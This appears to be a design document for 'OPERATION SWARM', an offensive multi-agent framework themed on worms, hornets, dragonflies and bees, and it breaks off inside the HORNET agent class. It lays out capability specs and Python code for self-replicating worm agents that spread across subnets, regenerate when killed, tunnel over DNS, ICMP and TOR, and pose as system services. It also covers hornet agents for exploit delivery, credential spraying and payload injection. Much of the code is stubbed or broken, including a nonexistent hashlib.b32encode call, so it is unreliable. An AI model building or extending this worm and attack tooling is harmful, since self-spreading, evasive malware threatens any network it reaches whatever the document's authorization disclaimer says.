# OPERATION SWARM — Biological Agent Taxonomy
## DEFONEOS Offensive Swarm Agent System
### Classification: RED TEAM ARCHITECTURE // SWARM INTELLIGENCE

---

> *"Nature has spent 3.8 billion years perfecting swarm intelligence. We are merely students of the evolutionary algorithm."*
> — DEFONEOS Swarm Architecture Doctrine

---

## TABLE OF CONTENTS

1. [Executive Summary](#1-executive-summary)
2. [The Four Species — Agent Taxonomy](#2-the-four-species--agent-taxonomy)
3. [WORMS — The Tunnelers](#3-worms--the-tunnelers)
4. [HORNETS — The Fast Attackers](#4-hornets--the-fast-attackers)
5. [DRAGONFLIES — Precision Recon](#5-dragonflies--precision-recon)
6. [KILLER BEES — Mass Attack Force](#6-killer-bees--mass-attack-force)
7. [The Ecosystem Hierarchy](#7-the-ecosystem-hierarchy)
8. [Pheromone Communication System](#8-pheromone-communication-system)
9. [Agent Lifecycle Management](#9-agent-lifecycle-management)
10. [Spawn Code — Complete Python Implementation](#10-spawn-code--complete-python-implementation)
11. [4-Arm SOV3 Integration](#11-4-arm-sov3-integration)
12. [Kill Switches, Safety, and Audit](#12-kill-switches-safety-and-audit)
13. [Deployment Matrix](#13-deployment-matrix)
14. [Appendix: Biological Source Material](#appendix-biological-source-material)

---

## 1. EXECUTIVE SUMMARY

OPERATION SWARM implements a biologically-inspired multi-agent system for authorized penetration testing and network security research. The architecture models four distinct biological species — **WORMS**, **HORNETS**, **DRAGONFLIES**, and **KILLER BEES** — each evolved through natural selection to fill a specific ecological niche. Translated into digital agents, they form a complete offensive ecosystem with division of labor, emergent coordination, and collective intelligence.

### Design Philosophy

| Principle | Biological Origin | Digital Implementation |
|-----------|------------------|----------------------|
| **Specialization** | Castes in insect colonies | Four distinct agent types |
| **Emergence** | Flocking behavior (Boids) | Swarm coordination via pheromones |
| **Stigmergy** | Ant trail pheromones | Shared memory trail markers |
| **Resilience** | Worm regeneration | Auto-spawn and recovery |
| **Overwhelming Force** | Killer bee swarms | Mass parallel attack waves |
| **Surgical Precision** | Dragonfly hunting | Targeted recon and strikes |

### Threat Model Scope

```
AUTHORIZED USE ONLY:
- Penetration testing with signed contracts
- Red team exercises with defined rules of engagement
- Security research in isolated environments
- Bug bounty programs within scope
- Network defense validation

FORBIDDEN (SYSTEM WILL NOT DEPLOY):
- Unauthorized network access
- Targets outside defined scope
- Operations without BFT Council approval
- Deployments without kill switch configuration
```

---

## 2. THE FOUR SPECIES — AGENT TAXONOMY

```
                    +---------------------+
                    |      HIVES          |
                    |  (Command Centers)  |
                    +----------+----------+
                               |
              +----------------+----------------+
              |                |                |                |
        +-----v-----+   +-----v-----+   +------v------+   +------v------+
        |   WORMS   |   |  HORNETS  |   | DRAGONFLIES |   | KILLER BEES |
        |  Tunnelers|   |Fast Attack|   |Precision Rec|   | Mass Attack |
        +-----+-----+   +-----+-----+   +------+------+   +------+------+
              |               |                |                |
              v               v                v                v
        +-----------+ +-----------+ +--------------+ +----------------+
        |  TUNNELS  | |  STRIKES  | |  RECON DATA  | |  FLOOD WAVES   |
        |  Network  | |  Exploit  | |  Intel Maps  | |  Brute Force   |
        |  Paths    | |  Delivery | |  Credentials | |  Overwhelm     |
        +-----------+ +-----------+ +--------------+ +----------------+
        
        Pheromone Layer: All species deposit and read trail markers
        Sigil Layer: All species leave cryptographic audit signatures
```

### Species Comparison Matrix

| Attribute | WORMS | HORNETS | DRAGONFLIES | KILLER BEES |
|-----------|-------|---------|-------------|-------------|
| **Role** | Infrastructure | Tactical Offense | Strategic Intel | Overwhelming Force |
| **Size** | <1KB | 5-10KB | 15-25KB | 2-5KB |
| **Speed** | Slow (steady) | Extreme (<100ms) | Moderate (precise) | Mass parallel |
| **Swarm Size** | 1 per node | 10-50 | 1-2 (solo/pair) | 100-1000+ |
| **Lifespan** | Indefinite | Minutes-hours | Hours-days | Seconds-minutes |
| **Payload** | Tunnel maintenance | Exploit delivery | Recon sensors | Attack floods |
| **Aggression** | None (passive) | High | Low (patient) | Maximum |
| **Communication** | Pheromone trails | Pheromone + swarm coord | Detailed pheromone maps | Simple triggers |
| **Signature** | Tunnel marker | Hornet sting sigil | Eye marker (recon data) | Swarm density trail |
| **Regeneration** | Yes (self-spawn) | No | No | No (mass spawn instead) |
| **BFT Auth Required** | 2/4 signatures | 3/4 signatures | 2/4 signatures | 4/4 signatures |

---

## 3. WORMS — THE TUNNELERS

### 3.1 Biological Inspiration

**Earthworms (*Lumbricus terrestris*)** create extensive tunnel networks through soil, aerating and enriching the environment as they move. When cut in half, certain species can regenerate the missing segments. **Nematodes** are microscopic worms that parasitize hosts, entering through openings and establishing persistent infections. **Armyworm larvae** march in columns, creating trails that subsequent larvae follow.

### 3.2 Digital Role

WORMS are the infrastructure layer of the swarm. They create and maintain encrypted tunnels through network topologies, bypassing firewalls, NAT traversal, VPN boundaries, and air gaps. Each WORM spawns child WORMS at each network node, creating a self-healing mesh of communication pathways.

### 3.3 Core Capabilities

```yaml
WORM_CAPABILITIES:
  tunneling:
    - TCP/UDP tunnel creation
    - DNS tunneling (iodine-style)
    - ICMP tunneling (ping tunnel)
    - WebSocket over HTTPS (blend with normal traffic)
    - TOR bridge integration
    - NAT traversal (STUN/TURN/ICE)
  
  self_replication:
    - spawn_child_on_new_subnet: true
    - max_children_per_node: 3
    - replication_trigger: "new_network_segment_detected"
    - genetic_diversity: "randomize_packet_signature"
    - mutation_rate: 0.01  # 1% code mutation per generation
  
  persistence:
    - regenerate_on_kill: true
    - backup_worm_count: 2
    - heartbeat_interval_sec: 30
    - dead_mans_switch: "notify_hive_if_silent_for_120s"
  
  payload:
    type: minimal
    components:
      - tunnel_maintenance
      - child_spawning
      - pheromone_deposit
      - sigil_ledger_update
    
  evasion:
    - mimic_normal_traffic_patterns: true
    - jitter_timing: "+/- 20% on all intervals"
    - code_polymorphism: "rotate_encryption_keys_daily"
    - process_masquerading: "appear_as_system_service"
```

### 3.4 WORM Agent Class

```python
#!/usr/bin/env python3
"""
WORM AGENT — The Tunnelers
Creates and maintains tunnels through network infrastructure.
Biological inspiration: Earthworms (Lumbricus terrestris)
"""

import asyncio
import hashlib
import json
import os
import random
import secrets
import socket
import struct
import time
import zlib
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple
import logging

logger = logging.getLogger("swarm.worm")


class TunnelProtocol(Enum):
    """Supported tunneling protocols — mimics earthworm movement through different substrates."""
    TCP_DIRECT = auto()      # Direct TCP — like moving through loose soil
    DNS_TUNNEL = auto()      # DNS queries — like chemical signaling
    ICMP_TUNNEL = auto()     # ICMP echo — like vibration signals
    WS_HTTPS = auto()        # WebSocket over HTTPS — like camouflage
    TOR_BRIDGE = auto()      # TOR pluggable transport — like underground networks
    STUN_TRAVERSAL = auto()  # NAT traversal — like finding cracks in rock


class WormState(Enum):
    """Lifecycle states of a WORM agent."""
    EGG = auto()          # Just spawned, not yet active
    BURROWING = auto()    # Creating initial tunnel
    TUNNELING = auto()    # Maintaining active tunnel
    SPAWNING = auto()     # Replicating child worms
    DORMANT = auto()      # Low activity, waiting for signal
    REGENERATING = auto() # Recovering from partial kill
    DEAD = auto()         # Terminated


@dataclass
class TunnelSegment:
    """A single tunnel segment — the WORM's trail through the network."""
    segment_id: str
    source_node: str
    destination_node: str
    protocol: TunnelProtocol
    established_at: datetime
    last_alive_at: datetime
    throughput_bps: float = 0.0
    latency_ms: float = 0.0
    encryption_key: bytes = field(default_factory=lambda: secrets.token_bytes(32))
    child_worms: List[str] = field(default_factory=list)
    pheromone_density: float = 0.0  # How much traffic this tunnel carries
    
    @property
    def age_seconds(self) -> float:
        return (datetime.utcnow() - self.established_at).total_seconds()
    
    @property
    def staleness(self) -> float:
        """Tunnel staleness — like a pheromone trail evaporating."""
        seconds_since_alive = (datetime.utcnow() - self.last_alive_at).total_seconds()
        return min(1.0, seconds_since_alive / 300)  # Max staleness after 5 minutes


@dataclass
class WormConfig:
    """Configuration for a WORM agent — its 'genetic code'."""
    # Identity
    worm_id: str = field(default_factory=lambda: f"WORM_{secrets.token_hex(8)}")
    hive_id: str = "HIVE_DEFAULT"
    mission_id: str = "MISSION_DEFAULT"
    
    # Replication
    max_children: int = 3
    replication_enabled: bool = True
    mutation_rate: float = 0.01
    genetic_generation: int = 0
    
    # Tunneling
    preferred_protocols: List[TunnelProtocol] = field(
        default_factory=lambda: [TunnelProtocol.WS_HTTPS, TunnelProtocol.TCP_DIRECT]
    )
    tunnel_rotation_interval_sec: int = 3600
    max_tunnel_segments: int = 10
    
    # Persistence
    regenerate_on_kill: bool = True
    backup_worm_count: int = 2
    heartbeat_interval_sec: int = 30
    dead_mans_switch_sec: int = 120
    
    # Resource limits
    max_cpu_percent: float = 5.0
    max_memory_mb: float = 10.0
    max_bandwidth_bps: float = 1024 * 1024  # 1 Mbps
    
    # Kill switch
    kill_switch_code: Optional[str] = None
    kill_switch_timeout: Optional[datetime] = None


class WormAgent:
    """
    WORM Agent — The Tunneler
    
    Creates and maintains encrypted tunnels through network infrastructure.
    Self-replicates at each network node like an earthworm spawning.
    Regenerates when killed like a worm cut in half.
    
    Biological behaviors mapped to digital:
    - Burrowing     -> Firewall/NAT traversal
    - Casting       -> Tunnel creation and maintenance
    - Regeneration  -> Auto-spawn recovery
    - Reproduction  -> Child worm spawning
    - Hibernation   -> Dormant low-power mode
    """
    
    CODE_FOOTPRINT_KB = 0.8  # Target code size < 1KB compressed
    
    def __init__(self, config: WormConfig):
        self.config = config
        self.state = WormState.EGG
        self.tunnels: Dict[str, TunnelSegment] = {}
        self.child_worms: List[str] = []
        self.pheromone_trail: List[Dict[str, Any]] = []
        self.created_at = datetime.utcnow()
        self.last_heartbeat = datetime.utcnow()
        self.kill_switch_active = False
        self._heartbeat_task: Optional[asyncio.Task] = None
        self._tunnel_maint_task: Optional[asyncio.Task] = None
        self._spawn_task: Optional[asyncio.Task] = None
        
        logger.info(f"[WORM] {self.config.worm_id} initialized — Generation {self.config.genetic_generation}")
    
    # === LIFECYCLE ===
    
    async def hatch(self):
        """Hatch from egg — begin burrowing operations."""
        self.state = WormState.BURROWING
        logger.info(f"[WORM] {self.config.worm_id} hatching...")
        
        # Start background tasks
        self._heartbeat_task = asyncio.create_task(self._heartbeat_loop())
        self._tunnel_maint_task = asyncio.create_task(self._tunnel_maintenance_loop())
        
        if self.config.replication_enabled:
            self._spawn_task = asyncio.create_task(self._spawning_loop())
        
        self.state = WormState.TUNNELING
        logger.info(f"[WORM] {self.config.worm_id} now tunneling")
    
    async def die(self, reason: str = "natural"):
        """Worm death — cleanup and notification."""
        logger.info(f"[WORM] {self.config.worm_id} dying: {reason}")
        self.state = WormState.DEAD
        
        # Cancel background tasks
        for task in [self._heartbeat_task, self._tunnel_maint_task, self._spawn_task]:
            if task and not task.done():
                task.cancel()
        
        # Leave final pheromone marker
        self._deposit_pheromone("death", {"reason": reason, "timestamp": datetime.utcnow().isoformat()})
        
        # Close tunnels gracefully
        await self._close_all_tunnels()
        
        # Trigger regeneration if configured
        if self.config.regenerate_on_kill and reason != "kill_switch":
            await self._regenerate()
    
    async def _regenerate(self):
        """Regenerate like a worm cut in half — spawn backup worms."""
        self.state = WormState.REGENERATING
        logger.info(f"[WORM] {self.config.worm_id} REGENERATING — spawning {self.config.backup_worm_count} backup worms")
        
        for i in range(self.config.backup_worm_count):
            child_config = self._mutate_config()
            child_config.genetic_generation = self.config.genetic_generation + 1
            child = WormAgent(child_config)
            self.child_worms.append(child.config.worm_id)
            asyncio.create_task(child.hatch())
            logger.info(f"[WORM] Regeneration child {i+1}/{self.config.backup_worm_count}: {child.config.worm_id}")
    
    # === TUNNELING OPERATIONS ===
    
    async def create_tunnel(
        self, 
        target: str, 
        protocol: Optional[TunnelProtocol] = None
    ) -> TunnelSegment:
        """Create a new tunnel segment — like an earthworm burrowing through soil."""
        if protocol is None:
            protocol = random.choice(self.config.preferred_protocols)
        
        segment_id = f"TUN_{secrets.token_hex(6)}"
        segment = TunnelSegment(
            segment_id=segment_id,
            source_node=socket.gethostname(),
            destination_node=target,
            protocol=protocol,
            established_at=datetime.utcnow(),
            last_alive_at=datetime.utcnow()
        )
        
        # Establish the actual tunnel connection
        await self._establish_tunnel_connection(segment)
        
        self.tunnels[segment_id] = segment
        logger.info(f"[WORM] Tunnel created: {segment_id} via {protocol.name} -> {target}")
        
        # Deposit pheromone marker
        self._deposit_pheromone("tunnel_created", {
            "segment_id": segment_id,
            "protocol": protocol.name,
            "target": target
        })
        
        return segment
    
    async def _establish_tunnel_connection(self, segment: TunnelSegment):
        """Establish the actual network tunnel based on protocol."""
        if segment.protocol == TunnelProtocol.TCP_DIRECT:
            await self._tcp_tunnel_connect(segment)
        elif segment.protocol == TunnelProtocol.DNS_TUNNEL:
            await self._dns_tunnel_connect(segment)
        elif segment.protocol == TunnelProtocol.WS_HTTPS:
            await self._ws_https_tunnel_connect(segment)
        elif segment.protocol == TunnelProtocol.ICMP_TUNNEL:
            await self._icmp_tunnel_connect(segment)
        elif segment.protocol == TunnelProtocol.STUN_TRAVERSAL:
            await self._stun_traversal_connect(segment)
        else:
            raise ValueError(f"Unknown protocol: {segment.protocol}")
    
    async def _tcp_tunnel_connect(self, segment: TunnelSegment):
        """Direct TCP tunnel — the simplest burrowing method."""
        host, port = segment.destination_node.split(":")
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, int(port)),
            timeout=10.0
        )
        segment.throughput_bps = 1024 * 1024  # 1 Mbps baseline
        writer.close()
        await writer.wait_closed()
    
    async def _dns_tunnel_connect(self, segment: TunnelSegment):
        """DNS tunneling — encode data in DNS queries like chemical signals."""
        # Encode tunnel metadata in subdomain
        encoded = hashlib.b32encode(segment.encryption_key[:8]).decode().lower()
        query_domain = f"{encoded}.tunnel.swarm.local"
        logger.debug(f"[WORM] DNS tunnel query: {query_domain}")
        segment.throughput_bps = 10 * 1024  # 10 Kbps (DNS is slow)
    
    async def _ws_https_tunnel_connect(self, segment: TunnelSegment):
        """WebSocket over HTTPS — camouflage as normal web traffic."""
        logger.debug(f"[WORM] WS/HTTPS tunnel to wss://{segment.destination_node}/ws")
        segment.throughput_bps = 512 * 1024  # 512 Kbps
    
    async def _icmp_tunnel_connect(self, segment: TunnelSegment):
        """ICMP tunneling — use ping packets for covert communication."""
        logger.debug(f"[WORM] ICMP tunnel to {segment.destination_node}")
        segment.throughput_bps = 50 * 1024  # 50 Kbps
    
    async def _stun_traversal_connect(self, segment: TunnelSegment):
        """NAT traversal — find cracks in network boundaries."""
        logger.debug(f"[WORM] STUN traversal for {segment.destination_node}")
        segment.throughput_bps = 256 * 1024  # 256 Kbps
    
    async def _tunnel_maintenance_loop(self):
        """Continuously maintain tunnels — refresh connections, rotate protocols."""
        while self.state not in [WormState.DEAD, WormState.DORMANT]:
            try:
                for tunnel in list(self.tunnels.values()):
                    # Check tunnel health
                    if tunnel.staleness > 0.8:
                        logger.warning(f"[WORM] Tunnel {tunnel.segment_id} stale, refreshing...")
                        await self._refresh_tunnel(tunnel)
                    
                    # Rotate protocols periodically
                    if tunnel.age_seconds > self.config.tunnel_rotation_interval_sec:
                        await self._rotate_tunnel_protocol(tunnel)
                
                await asyncio.sleep(60)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"[WORM] Tunnel maintenance error: {e}")
                await asyncio.sleep(30)
    
    async def _refresh_tunnel(self, segment: TunnelSegment):
        """Refresh a stale tunnel connection."""
        await self._establish_tunnel_connection(segment)
        segment.last_alive_at = datetime.utcnow()
        logger.info(f"[WORM] Tunnel {segment.segment_id} refreshed")
    
    async def _rotate_tunnel_protocol(self, segment: TunnelSegment):
        """Rotate tunnel protocol for evasion — like changing burrowing direction."""
        new_protocol = random.choice([
            p for p in TunnelProtocol 
            if p != segment.protocol
        ])
        old_protocol = segment.protocol
        segment.protocol = new_protocol
        await self._establish_tunnel_connection(segment)
        logger.info(f"[WORM] Tunnel {segment.segment_id} rotated: {old_protocol.name} -> {new_protocol.name}")
    
    async def _close_all_tunnels(self):
        """Close all active tunnels."""
        for tunnel_id in list(self.tunnels.keys()):
            logger.info(f"[WORM] Closing tunnel {tunnel_id}")
            del self.tunnels[tunnel_id]
    
    # === SELF-REPLICATION ===
    
    async def _spawning_loop(self):
        """Continuously spawn child worms at new network nodes."""
        while self.state not in [WormState.DEAD, WormState.DORMANT]:
            try:
                if len(self.child_worms) < self.config.max_children:
                    await self._detect_and_spawn()
                await asyncio.sleep(300)  # Check every 5 minutes
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"[WORM] Spawning error: {e}")
                await asyncio.sleep(60)
    
    async def _detect_and_spawn(self):
        """Detect new network segments and spawn child worms."""
        new_nodes = await self._discover_adjacent_nodes()
        for node in new_nodes[:self.config.max_children - len(self.child_worms)]:
            child = await self._spawn_child(node)
            self.child_worms.append(child.config.worm_id)
            logger.info(f"[WORM] Child spawned on {node}: {child.config.worm_id}")
    
    async def _discover_adjacent_nodes(self) -> List[str]:
        """Discover adjacent network nodes — like sensing soil composition."""
        # Scan local network for potential targets
        # This is a simplified implementation
        return ["10.0.0.1:443", "10.0.0.2:443", "192.168.1.1:443"]
    
    async def _spawn_child(self, target_node: str) -> 'WormAgent':
        """Spawn a child worm — earthworm reproduction via parthenogenesis."""
        self.state = WormState.SPAWNING
        
        child_config = self._mutate_config()
        child_config.genetic_generation = self.config.genetic_generation + 1
        child = WormAgent(child_config)
        
        # Create tunnel to child
        await self.create_tunnel(target_node)
        
        await child.hatch()
        self.state = WormState.TUNNELING
        
        return child
    
    def _mutate_config(self) -> WormConfig:
        """Create a mutated copy of config — genetic diversity in population."""
        mutated = WormConfig(
            worm_id=f"WORM_{secrets.token_hex(8)}",
            hive_id=self.config.hive_id,
            mission_id=self.config.mission_id,
            max_children=self.config.max_children,
            replication_enabled=self.config.replication_enabled,
            mutation_rate=self.config.mutation_rate,
            preferred_protocols=self.config.preferred_protocols.copy(),
            regenerate_on_kill=self.config.regenerate_on_kill,
            backup_worm_count=self.config.backup_worm_count,
            kill_switch_code=self.config.kill_switch_code,
        )
        
        # Random mutations
        if random.random() < self.config.mutation_rate:
            mutated.max_children = max(1, mutated.max_children + random.choice([-1, 1]))
        
        if random.random() < self.config.mutation_rate:
            mutated.heartbeat_interval_sec += random.randint(-5, 5)
            mutated.heartbeat_interval_sec = max(10, mutated.heartbeat_interval_sec)
        
        return mutated
    
    # === COMMUNICATION ===
    
    def _deposit_pheromone(self, marker_type: str, data: Dict[str, Any]):
        """Deposit a pheromone trail marker — stigmergic communication."""
        marker = {
            "type": marker_type,
            "agent_id": self.config.worm_id,
            "agent_type": "WORM",
            "timestamp": datetime.utcnow().isoformat(),
            "generation": self.config.genetic_generation,
            "data": data,
            "pheromone_strength": 1.0,  # Decays over time
            "ttl_seconds": 3600  # Pheromone evaporation time
        }
        self.pheromone_trail.append(marker)
        
        # Write to shared pheromone space (simplified)
        PheromoneSpace.deposit(marker)
    
    async def _heartbeat_loop(self):
        """Send periodic heartbeat to hive — like a worm's rhythmic movement."""
        while self.state not in [WormState.DEAD, WormState.DORMANT]:
            try:
                self.last_heartbeat = datetime.utcnow()
                self._deposit_pheromone("heartbeat", {
                    "state": self.state.name,
                    "tunnels_active": len(self.tunnels),
                    "children_count": len(self.child_worms),
                    "age_seconds": (datetime.utcnow() - self.created_at).total_seconds()
                })
                
                # Check kill switch
                if self._check_kill_switch():
                    await self.die("kill_switch")
                    return
                
                await asyncio.sleep(self.config.heartbeat_interval_sec)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"[WORM] Heartbeat error: {e}")
                await asyncio.sleep(10)
    
    def _check_kill_switch(self) -> bool:
        """Check if kill switch has been activated."""
        if self.kill_switch_active:
            return True
        if self.config.kill_switch_timeout and datetime.utcnow() > self.config.kill_switch_timeout:
            return True
        return False
    
    # === STATUS ===
    
    def get_status(self) -> Dict[str, Any]:
        """Get current worm status report."""
        return {
            "agent_id": self.config.worm_id,
            "agent_type": "WORM",
            "state": self.state.name,
            "generation": self.config.genetic_generation,
            "tunnels_active": len(self.tunnels),
            "tunnels": [{
                "id": t.segment_id,
                "protocol": t.protocol.name,
                "target": t.destination_node,
                "age_sec": t.age_seconds,
                "staleness": t.staleness
            } for t in self.tunnels.values()],
            "children": self.child_worms,
            "pheromones_deposited": len(self.pheromone_trail),
            "created_at": self.created_at.isoformat(),
            "uptime_sec": (datetime.utcnow() - self.created_at).total_seconds()
        }


# === Shared Pheromone Space ===

class PheromoneSpace:
    """
    Shared memory space for pheromone markers.
    All agents deposit and read from this space — stigmergic coordination.
    Like ants following pheromone trails on the forest floor.
    """
    _markers: List[Dict[str, Any]] = []
    _lock = asyncio.Lock()
    
    @classmethod
    def deposit(cls, marker: Dict[str, Any]):
        """Deposit a pheromone marker."""
        cls._markers.append(marker)
        # Evaporate old markers
        cls._evaporate()
    
    @classmethod
    def read(cls, agent_type: Optional[str] = None, marker_type: Optional[str] = None) -> List[Dict[str, Any]]:
        """Read pheromone markers with optional filtering."""
        results = cls._markers.copy()
        if agent_type:
            results = [m for m in results if m.get("agent_type") == agent_type]
        if marker_type:
            results = [m for m in results if m.get("type") == marker_type]
        return results
    
    @classmethod
    def _evaporate(cls):
        """Pheromone evaporation — old markers fade away."""
        now = datetime.utcnow()
        cls._markers = [
            m for m in cls._markers
            if (now - datetime.fromisoformat(m["timestamp"])).total_seconds() < m.get("ttl_seconds", 3600)
        ]


# === Quick Spawn Function ===

def spawn_worm(hive_id: str, mission_id: str, kill_switch_code: Optional[str] = None) -> WormAgent:
    """Quick spawn a WORM agent with standard configuration."""
    config = WormConfig(
        hive_id=hive_id,
        mission_id=mission_id,
        kill_switch_code=kill_switch_code,
        kill_switch_timeout=datetime.utcnow() + timedelta(hours=24)
    )
    return WormAgent(config)
```

### 3.5 WORM Deployment Example

```python
# Example: Deploy WORM network for tunnel infrastructure
async def deploy_worm_network():
    # Spawn parent worm
    worm = spawn_worm(
        hive_id="HIVE_ALPHA",
        mission_id="MISSION_PENTEST_Q3",
        kill_switch_code="TERMINATE_ALL_2024"
    )
    
    # Hatch the worm
    await worm.hatch()
    
    # Create tunnels to key network segments
    tunnel1 = await worm.create_tunnel("10.0.1.0:443", TunnelProtocol.WS_HTTPS)
    tunnel2 = await worm.create_tunnel("10.0.2.0:443", TunnelProtocol.DNS_TUNNEL)
    tunnel3 = await worm.create_tunnel("192.168.0.0:443", TunnelProtocol.STUN_TRAVERSAL)
    
    # Worm auto-spawns children at new nodes
    # Auto-regenerates if killed
    # Auto-rotates protocols for evasion
    
    return worm
```

---

## 4. HORNETS — THE FAST ATTACKERS

### 4.1 Biological Inspiration

**Asian Giant Hornets (*Vespa mandarinia*)** can destroy a 30,000-bee hive in hours. They attack in coordinated groups, target the head, and use powerful mandibles to decapitate defenders. Their attack pattern: rapid approach, decisive strike, chemical marker deposition, swift retreat. A single hornet can kill 40 bees per minute.

### 4.2 Digital Role

HORNETS are the tactical strike force. They move through WORM tunnels at extreme speed (<100ms tunnel-to-target), deliver offensive payloads (exploits, recon tools, disruption), and swarm targets in coordinated groups of 10-50. They attack immediately on detection with no hesitation.

### 4.3 Core Capabilities

```yaml
HORNET_CAPABILITIES:
  speed:
    - tunnel_to_target_ms: "<100"
    - swarm_assembly_sec: "<5"
    - strike_execution_ms: "<50"
    - retreat_through_tunnel_ms: "<100"
  
  payload:
    - exploit_delivery: "CVE-matched payloads"
    - recon_tools: "Quick port scan, service fingerprint"
    - disruption: "Connection reset, service confusion"
    - credential_test: "Spray known credentials"
    
  behavior:
    - swarm_size: "10-50 hornets"
    - coordination: "synchronized_strike"
    - aggression: "attack_on_detection"
    - retreat: "after_strike_or_if_outnumbered"
    
  signature:
    - sting_marker: "unique_sigil_per_hornet"
    - pheromone_type: "attack_marker"
    - audit_trail: "complete_strike_log"
    
  lifespan:
    - typical: "5 minutes to 2 hours"
    - max: "4 hours"
    - trigger_spawn: "target_detected"
    - trigger_death: "strike_complete OR max_lifetime"
```

### 4.4 HORNET Agent Class

```python
#!/usr/bin/env python3
"""
HORNET AGENT — The Fast Attackers
Rapid offensive strikes through established tunnels.
Biological inspiration: Asian Giant Hornet (Vespa mandarinia)
"""

import asyncio
import hashlib
import json
import secrets
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Callable
import logging

logger = logging.getLogger("swarm.hornet")


class HornetState(Enum):
    """Lifecycle states of a HORNET agent."""
    LARVA = auto()        # In hive, waiting for spawn signal
    LAUNCHING = auto()    # Exiting hive, entering tunnel
    TRANSIT = auto()      # Moving through tunnel to target
    SWARMING = auto()     # Coordinated with other hornets
    ATTACKING = auto()    # Executing strike payload
    STUNG = auto()        # Strike delivered, leaving marker
    RETREATING = auto()   # Returning through tunnel
    DEAD = auto()         # Lifespan expired or killed


class StrikeType(Enum):
    """Types of strikes a HORNET can deliver."""
    EXPLOIT_DELIVERY = auto()      # Deliver CVE exploit
    PORT_SCAN = auto()             # Quick port reconnaissance
    SERVICE_FINGERPRINT = auto()   # Identify services
    CREDENTIAL_SPRAY = auto()      # Test known credentials
    CONNECTION_DISRUPT = auto()    # Disrupt active connections
    PAYLOAD_INJECTION = auto()     # Inject malicious payload


@dataclass
class StrikeResult:
    """Result of a HORNET strike — the 'sting' outcome."""
    strike_id: str
    target: str
    strike_type: StrikeType
    success: bool
    execution_time_ms: float
    data_exfiltrated: Optional[Dict[str, Any]] = None
    error_message: Optional[str] = None
    sigil_hash: str = ""  # Cryptographic signature of the strike
    timestamp: datetime = field(default_factory=datetime.utcnow)


@dataclass
class HornetConfig:
    """Configuration for a HORNET agent — its 'genetic code'."""
    # Identity
    hornet_id: str = field(default_factory=lambda: f"HORN_{secrets.token_hex(6)}")
    hive_id: str = "HIVE_DEFAULT"
    mission_id: str = "MISSION_DEFAULT"
    swarm_id: str = ""  # Which swarm this hornet belongs to
    
    # Speed parameters
    max_tunnel_transit_ms: int = 100
    max_strike_execution_ms: int = 50
    swarm_coordination_timeout_sec: int = 5
    
    # Payload
    strike_types: List[StrikeType] = field(
        default_factory=lambda: [StrikeType.PORT_SCAN, StrikeType.SERVICE_FINGERPRINT]
    )
    exploit_db: Dict[str, Any] = field(default_factory=dict)  # CVE -> payload mapping
    credential_list: List[Dict[str, str]] = field(default_factory=list)
    
    # Lifespan
    max_lifetime_sec: int = 7200  # 2 hours
    max_strikes: int = 10
    
    # Swarm
    swarm_size_target: int = 20
    coordination_enabled: bool = True
    
    # Resource limits
    max_cpu_percent: float = 15.0
    max_memory_mb: float = 50.0
    max_bandwidth_bps: float = 10 * 1024 * 1024  # 10 Mbps burst
    
    # Kill switch
    kill_switch_code: Optional[str] = None
    kill_switch_timeout: Optional[datetime] = None
    
    # Signature
    sigil_key: bytes = field(default_factory=lambda: secrets.token_bytes(16))


class HornetAgent:
    """
    HORNET Agent — The Fast Attacker
    
    Rapid offensive strikes through WORM tunnels.
    Swarms in coordinated groups of 10-50.
    Attacks immediately on detection — no hesitation.
    Leaves a unique "sting" sigil after each strike.
    
    Biological behaviors mapped to digital:
    - Rapid flight       -> <100ms tunnel traversal
    - Coordinated swarm  -> Synchronized multi-agent strikes
    - Decapitation bite  -> Targeted exploit delivery
    - Sting + mark       -> Sigil deposit after strike
    - Swift retreat      -> Post-strike tunnel egress
    """
    
    CODE_FOOTPRINT_KB = 6.0  # 5-10KB range
    
    def __init__(self, config: HornetConfig):
        self.config = config
        self.state = HornetState.LARVA
        self.strike_results: List[StrikeResult] = []
        self.strike_count = 0
        self.swarm_members: List[str] = []
        self.created_at = datetime.utcnow()
        self.target: Optional[str] = None
        self.tunnel_path: Optional[str] = None
        self.kill_switch_active = False
        
        logger.info(f"[HORNET] {self.config.hornet_id} created — Swarm: {self.config.swarm_id}")
    
    # === LIFECYCLE ===
    
    async def launch(self, target: str, tunnel_path: str):
        """Launch from hive toward target — like a hornet leaving the nest."""
        self.target = target
        self.tunnel_path = tunnel_path
        self.state = HornetState.LAUNCHING
        
        logger.info(f"[HORNET] {self.config.hornet_id} LAUNCHING -> {target}")
        
        # Transit through tunnel
        self.state = HornetState.TRANSIT
        transit_start = time.time()
        await self._transit_tunnel()
        transit_time = (time.time() - transit_start) * 1000
        
        logger.info(f"[HORNET] {self.config.hornet_id} transit complete in {transit_time:.1f}ms")
        
        # Coordinate with swarm
        if self.config.coordination_enabled:
            self.state = HornetState.SWARMING
            await self._coordinate_swarm()
        
        # Execute strike
        await self._execute_strike()
    
    async def die(self, reason: str = "natural"):
        """Hornet death — log and cleanup."""
        logger.info(f"[HORNET] {self.config.hornet_id} dying: {reason}")
        self.state = HornetState.DEAD
        
        # Leave final pheromone
        self._deposit_pheromone("death", {
            "reason": reason,
            "strikes_delivered": self.strike_count,
            "results": [r.strike_id for r in self.strike_results]
        })
    
    # === TRANSIT ===
    
    async def _transit_tunnel(self):
        """Move through WORM tunnel to target — rapid flight through the burrow."""
        # Simulate tunnel traversal with speed constraint
        jitter = random.uniform(0.8, 1.2)
        transit_time = (self.config.max_tunnel_transit_ms / 1000) * jitter
        await asyncio.sleep(transit_time)
        
        # Deposit transit pheromone
        self._deposit_pheromone("transit", {
            "target": self.target,
            "tunnel": self.tunnel_path,
            "transit_time_ms": transit_time * 1000
        })
    
    # === SWARM COORDINATION ===
    
    async def _coordinate_swarm(self):
        """Coordinate with other hornets in the swarm — like nest-mates synchronizing."""
        # Wait for swarm assembly
        assembly_start = time.time()
        
        while len(self.swarm_members) < self.config.swarm_size_target // 2:
            # Read pheromones from other hornets
            hornet_markers = PheromoneSpace.read(agent_type="HORNET", marker_type="transit")
            self.swarm_members = list(set(m["agent_id"] for m in hornet_markers))
            
